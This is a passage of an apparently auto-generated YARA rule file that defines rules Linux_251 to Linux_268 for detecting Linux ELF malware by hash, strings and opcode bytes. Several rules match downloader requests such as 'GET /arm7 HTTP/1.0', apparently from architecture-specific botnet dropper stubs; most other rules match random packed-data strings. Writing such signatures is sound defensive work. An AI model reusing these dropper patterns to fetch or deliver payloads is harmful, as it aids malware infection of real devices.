   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      8 of them
}

rule Linux_251 {
   meta:
      description = "Linux_251"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4de920dbc2bb1f89e07066a89b1bee0d9bd788f50af77be5f3663d0088c610da"
   strings:
      $s1 = "GET /arm5 HTTP/1.0" fullword ascii

      $op0 = { 01 18 a0 e1 ff 18 01 e2 00 1c 81 e1 ff 30 03 e2 }
      $op1 = { ea 01 40 84 e2 00 60 d4 e5 00 00 56 e3 fb ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 3KB and
      ( all of them and all of ($op*) )
}

rule Linux_252 {
   meta:
      description = "Linux_252"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f934f17876a84737f1674b440cb8e29adeea5e4955ad7e8dc5fd37b6bfc9bad0"
   strings:
      $s1 = "GET /arm5 HTTP/1.0" fullword ascii

      $op0 = { 01 18 a0 e1 ff 18 01 e2 00 1c 81 e1 ff 30 03 e2 }
      $op1 = { ea 01 40 84 e2 00 60 d4 e5 00 00 56 e3 fb ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 3KB and
      ( all of them and all of ($op*) )
}

rule Linux_253 {
   meta:
      description = "Linux_253"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4e1937436febcd73edabd3fee1fad514eb9f57f0dc48a8aa93b81e3f4eb5855d"
   strings:
      $s1 = "* $N8[7t" fullword ascii
      $s2 = "YyHQW\\" fullword ascii
      $s3 = ")rlyp,,h" fullword ascii
      $s4 = "-HuYorh[@" fullword ascii
      $s5 = "\\kyUauO" fullword ascii
      $s6 = "p=17N v" fullword ascii
      $s7 = "$bZ=!B" fullword ascii
      $s8 = " 7AdbE" fullword ascii
      $s9 = "g&HmBq" fullword ascii
      $s10 = "X;.8+[" fullword ascii
      $s11 = "4z75[;" fullword ascii
      $s12 = "c^oZ00" fullword ascii
      $s13 = "k&G1]J+m" fullword ascii
      $s14 = "Ng:wdv7" fullword ascii
      $s15 = "*KCS%j" fullword ascii
      $s16 = "DdA]yQ" fullword ascii
      $s17 = "UP8'ag" fullword ascii
      $s18 = "y?D5v\"C" fullword ascii
      $s19 = "E\\XQSz" fullword ascii
      $s20 = "dUkt/E" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_254 {
   meta:
      description = "Linux_254"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "4f2875b41146a2c534df2155dff98ef369d1a92c6c53bcc07783290dce445901"
   strings:
      $s1 = "[Zxri/dw" fullword ascii
      $s2 = "WtvU#s_." fullword ascii
      $s3 = "serKWVi" fullword ascii
      $s4 = "Mutx$VK" fullword ascii
      $s5 = "PIZqA1h" fullword ascii
      $s6 = "\\kyUauO" fullword ascii
      $s7 = "\\WI{49" fullword ascii
      $s8 = "p=17N v" fullword ascii
      $s9 = "l%>Vku^C" fullword ascii
      $s10 = "IH }NT{" fullword ascii
      $s11 = "Bf=PZL6" fullword ascii
      $s12 = "OZ!1|0" fullword ascii
      $s13 = "jfH~?B" fullword ascii
      $s14 = ":@?yBO" fullword ascii
      $s15 = "\"VF-Wmw" fullword ascii
      $s16 = "2oA!-*s" fullword ascii
      $s17 = "?Ai'V@" fullword ascii
      $s18 = "2o?98=p" fullword ascii
      $s19 = "}HN9)i" fullword ascii
      $s20 = "'hKTtg" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_255 {
   meta:
      description = "Linux_255"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "51e22531837967bf76da386c59d225cbe14170115f296c9cfd8e71152285de95"
   strings:
      $s1 = "xTMhn\\" fullword ascii
      $s2 = "ZGml_9\\" fullword ascii
      $s3 = "RXwd$\"C" fullword ascii
      $s4 = "IMQm)6m" fullword ascii
      $s5 = "ynQEb_<" fullword ascii
      $s6 = "bvnfk4\\" fullword ascii
      $s7 = "QCJB[9p" fullword ascii
      $s8 = "PHCX]CK" fullword ascii
      $s9 = "hzrV_3e" fullword ascii
      $s10 = "\\zZs'^" fullword ascii
      $s11 = "]n:#=S" fullword ascii
      $s12 = "lE1&Jn" fullword ascii
      $s13 = "cq N_#t" fullword ascii
      $s14 = ".cm:IMs" fullword ascii
      $s15 = "-E+tq$" fullword ascii
      $s16 = "?AWS{K" fullword ascii
      $s17 = "CX/X065" fullword ascii
      $s18 = "N'c='|" fullword ascii
      $s19 = "VW6Q4Q" fullword ascii
      $s20 = "Ij$=B-" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_256 {
   meta:
      description = "Linux_256"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "9459bf214b6c82c64678ad590e2808f992cb1a2febbac31bda288ccffec8d3ee"
   strings:
      $s1 = "GET /arm7 HTTP/1.0" fullword ascii

      $op0 = { 01 38 83 e1 00 3c 83 e1 02 34 83 e1 03 0c a0 e1 }
      $op1 = { ea 01 80 88 e2 01 60 53 e5 00 00 56 e3 01 30 83 }
      $op2 = { ef f0 00 bd e8 01 0a 70 e3 0e f0 a0 31 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 4KB and
      ( all of them and all of ($op*) )
}

rule Linux_257 {
   meta:
      description = "Linux_257"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "eb7f1f11a5e88c8c035bf521d569b5d32d6523e749dcfcbea210a63e8ecd7775"
   strings:
      $s1 = "GET /arm7 HTTP/1.0" fullword ascii

      $op0 = { 01 38 83 e1 00 3c 83 e1 02 34 83 e1 03 0c a0 e1 }
      $op1 = { ea 01 80 88 e2 01 60 53 e5 00 00 56 e3 01 30 83 }
      $op2 = { ef f0 00 bd e8 01 0a 70 e3 0e f0 a0 31 ff ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 4KB and
      ( all of them and all of ($op*) )
}

rule Linux_258 {
   meta:
      description = "Linux_258"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "98a2ad93d6b96ee38f6892faff0eb71cb927f80f82820ab03e292e0161995f66"
   strings:
      $s1 = "GET /mpsl HTTP/1.0" fullword ascii

      $op0 = { 05 00 1c 3c 34 81 9c 27 21 e0 9f 03 21 f8 00 00 }
      $op1 = { 09 f8 20 03 21 80 80 00 10 00 bc 8f 00 00 50 ac }
      $op2 = { ff 00 a5 30 00 2c 05 00 00 26 04 00 25 20 85 00 }
   condition:
      uint16(0) == 0x457f and filesize < 5KB and
      ( all of them and all of ($op*) )
}

rule Linux_259 {
   meta:
      description = "Linux_259"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "9aa7bd8f43cd022fd06b1c1e7cf901a8593e4b4509a956ecb9b0cc4955187b98"
   strings:
      $s1 = "GET /mpsl HTTP/1.0" fullword ascii

      $op0 = { 09 f8 20 03 21 80 80 00 10 00 bc 8f 00 00 50 ac }
      $op1 = { ff 00 a5 30 00 2c 05 00 00 26 04 00 25 20 85 00 }
      $op2 = { 08 00 e0 03 30 00 bd 27 05 00 1c 3c a8 84 9c 27 }
   condition:
      uint16(0) == 0x457f and filesize < 5KB and
      ( all of them and all of ($op*) )
}

rule Linux_260 {
   meta:
      description = "Linux_260"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8659ffddbf25bb5cf821a0b2a045f29f9345c410525d316528ab74d1f22d0835"
   strings:
      $s1 = "\"{$Z:\\" fullword ascii
      $s2 = "U%G.qFf" fullword ascii
      $s3 = "kuAe>,!" fullword ascii
      $s4 = "hqvi\"26" fullword ascii
      $s5 = "xvvhH5d" fullword ascii
      $s6 = "D=jItX#p." fullword ascii
      $s7 = "\\40;xoH{" fullword ascii
      $s8 = "\\rIKb'" fullword ascii
      $s9 = ">R(`C#" fullword ascii
      $s10 = ")T%'vZ" fullword ascii
      $s11 = "Ue~>\"o" fullword ascii
      $s12 = ">'_sK!1" fullword ascii
      $s13 = "PIYl)[" fullword ascii
      $s14 = "6I7a ;B" fullword ascii
      $s15 = "Z;',}R" fullword ascii
      $s16 = "=gm`6d" fullword ascii
      $s17 = "$G$np;" fullword ascii
      $s18 = "%72[jc" fullword ascii
      $s19 = "r0>hqq" fullword ascii
      $s20 = "4.1tVv" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_261 {
   meta:
      description = "Linux_261"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8e3594454af3c4a862347ca7baee51d936f8eda31e0ff9937f76534a5eb5796d"
   strings:
      $s1 = "GET /arm HTTP/1.0" fullword ascii

      $op0 = { 01 18 a0 e1 ff 18 01 e2 00 1c 81 e1 ff 30 03 e2 }
      $op1 = { ea 01 40 84 e2 00 60 d4 e5 00 00 56 e3 fb ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 3KB and
      ( all of them and all of ($op*) )
}

rule Linux_262 {
   meta:
      description = "Linux_262"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "955cda664b10dee6d2bb8ca36d16c3688930084e5faaa5785079bd9d6237e8ac"
   strings:
      $s1 = "GET /arm HTTP/1.0" fullword ascii

      $op0 = { 01 18 a0 e1 ff 18 01 e2 00 1c 81 e1 ff 30 03 e2 }
      $op1 = { ea 01 40 84 e2 00 60 d4 e5 00 00 56 e3 fb ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 3KB and
      ( all of them and all of ($op*) )
}

rule Linux_263 {
   meta:
      description = "Linux_263"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a32e912bff92c2c482a129304633cfa55576b801868e90c0d9846fd49b2e3d4c"
   strings:
      $s1 = "Umcs0Xa" fullword ascii
      $s2 = "lGnX]pOa(P" fullword ascii
      $s3 = "C.nEU=" fullword ascii
      $s4 = "%g:Ut(H" fullword ascii
      $s5 = "\\pwjM(" fullword ascii
      $s6 = "\\&cwrL" fullword ascii
      $s7 = "\\5&d@8s" fullword ascii
      $s8 = "0L%`\\>" fullword ascii
      $s9 = "1+|.#/" fullword ascii
      $s10 = "u@Ac]m" fullword ascii
      $s11 = "Z<E&'}" fullword ascii
      $s12 = "?{$]sV" fullword ascii
      $s13 = "k^rovQ" fullword ascii
      $s14 = "I,W}>YlS" fullword ascii
      $s15 = "AXL\"j;;'7" fullword ascii
      $s16 = "zNG86Y" fullword ascii
      $s17 = "<ZKuu'" fullword ascii
      $s18 = "W#Of=R`" fullword ascii
      $s19 = "'_1SRh" fullword ascii
      $s20 = "mWT<c8" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_264 {
   meta:
      description = "Linux_264"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "ae929fbb262738444cda49033a1b3d57ca36b272b411970da268e31689d950ff"
   strings:
      $s1 = "5j?o -" fullword ascii
      $s2 = "Jbx^%k%" fullword ascii
      $s3 = "DZEuGsw" fullword ascii
      $s4 = "CjGg7at-" fullword ascii
      $s5 = "klEAG H" fullword ascii
      $s6 = "YLBwzm/" fullword ascii
      $s7 = "mbZn(tZ" fullword ascii
      $s8 = "cNPJXd" fullword ascii
      $s9 = "D\\r6s#g" fullword ascii
      $s10 = "2ev<+pz6" fullword ascii
      $s11 = "dFygU." fullword ascii
      $s12 = ".ed*Q$" fullword ascii
      $s13 = "q?=|x\"" fullword ascii
      $s14 = "$~1jS0" fullword ascii
      $s15 = "<w#y5+" fullword ascii
      $s16 = "I8j[EW" fullword ascii
      $s17 = "Ni_A1T" fullword ascii
      $s18 = "x!d;fp" fullword ascii
      $s19 = "w4r`?E" fullword ascii
      $s20 = "!$X(zG" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_265 {
   meta:
      description = "Linux_265"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "bfd240e4856c4db4d44e030b7d7d10a09deecac4b113b35db010c126a81265c2"
   strings:
      $s1 = "p0ccff" fullword ascii
      $s2 = "0GCGx_?[" fullword ascii
      $s3 = "QuXH!k" fullword ascii
      $s4 = "PBmZU|V" fullword ascii
      $s5 = "\\/NyK/" fullword ascii
      $s6 = ">c.\\av" fullword ascii
      $s7 = "T43+G1#" fullword ascii
      $s8 = "R1E[:}" fullword ascii
      $s9 = "y2x{:>" fullword ascii
      $s10 = "oY,!|iy" fullword ascii
      $s11 = "j+IlxH" fullword ascii
      $s12 = "am0xQM" fullword ascii
      $s13 = "'V)>jh" fullword ascii
      $s14 = "#) w1~" fullword ascii
      $s15 = "7Kjrx&" fullword ascii
      $s16 = "8M)ustk" fullword ascii
      $s17 = "!V4Wt{" fullword ascii
      $s18 = "`At?&W" fullword ascii
      $s19 = "*fL^%[" fullword ascii
      $s20 = "&+#ltp" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_266 {
   meta:
      description = "Linux_266"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d0ca9ff1304cca7a9ffe1ba91fbd444ae0aa2f67b38d7b906cabcafa351c6315"
   strings:
      $s1 = "jwjF]{<" fullword ascii
      $s2 = "<PnOp?" fullword ascii
      $s3 = "xarj5\"-" fullword ascii
      $s4 = "lstKk>\\" fullword ascii
      $s5 = "TbRw<)F" fullword ascii
      $s6 = "\\X!zM=R" fullword ascii
      $s7 = "iVy/lP" fullword ascii
      $s8 = ")wU#,;" fullword ascii
      $s9 = "'u:eRu\\FL" fullword ascii
      $s10 = ":g0Jr " fullword ascii
      $s11 = "S$s1I\"Lj" fullword ascii
      $s12 = "HTS*vTZ" fullword ascii
      $s13 = "UnO::\\#" fullword ascii
      $s14 = "2r?zy>" fullword ascii
      $s15 = ">oJ5/'" fullword ascii
      $s16 = "tdgha=" fullword ascii
      $s17 = "]wTw~j" fullword ascii
      $s18 = "(GIZ)jx" fullword ascii
      $s19 = "n*Kl]%" fullword ascii
      $s20 = "}eYYi~" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_267 {
   meta:
      description = "Linux_267"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "d9c19288bf7903140eb492b6457fe133ee87509799a0c297a30d728c24b25953"
   strings:
      $s1 = "$(bi* " fullword ascii
      $s2 = "TdSAt9'" fullword ascii
      $s3 = "mJISW%]" fullword ascii
      $s4 = "VOWblhTb" fullword ascii
      $s5 = "\\u,j*`#" fullword ascii
      $s6 = "&kpz,m" fullword ascii
      $s7 = "Ma=9Kz" fullword ascii
      $s8 = "9[~W+S" fullword ascii
      $s9 = "9{OCV " fullword ascii
      $s10 = "3F<;}U" fullword ascii
      $s11 = "0%\\rdpx" fullword ascii
      $s12 = " ke'nAL" fullword ascii
      $s13 = "I3;NZ8" fullword ascii
      $s14 = "9G5mK\\\\" fullword ascii
      $s15 = "b<jj|F" fullword ascii
      $s16 = "dOPYAV" fullword ascii
      $s17 = "@@w;?eKB" fullword ascii
      $s18 = "V=Dmq%" fullword ascii
      $s19 = "[:p1dP" fullword ascii
      $s20 = "> QCZ1" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_268 {
   meta:
      description = "Linux_268"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f61d3e004cce67f579d005667efe3137218d2a18946cbef046aec5af36f38436"
   strings:
      $s1 = "BESq3.M=" fullword ascii
      $s2 = "ZBtK8a,3" fullword ascii
      $s3 = ";W;.ddh" fullword ascii
      $s4 = "UyQv>bS" fullword ascii
      $s5 = "e;\\'pGqeN!]" fullword ascii
      $s6 = "bbdg[U'}" fullword ascii
      $s7 = "\\y3/QMf" fullword ascii
      $s8 = "X-/jnP" fullword ascii
      $s9 = "vA`f]}" fullword ascii
      $s10 = "a4T*Qv`" fullword ascii
      $s11 = "xb\\N6&" fullword ascii
      $s12 = "G+?kou" fullword ascii
      $s13 = "M**o&U(E}" fullword ascii
      $s14 = "@kCg%[R" fullword ascii
      $s15 = "G]$CIb" fullword ascii
      $s16 = "s@M9B\\" fullword ascii
      $s17 = "_%1b){" fullword ascii
      $s18 = "tkwp>7" fullword ascii
      $s19 = "-O),o|`" fullword ascii
      $s20 = "p7}hC+" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}
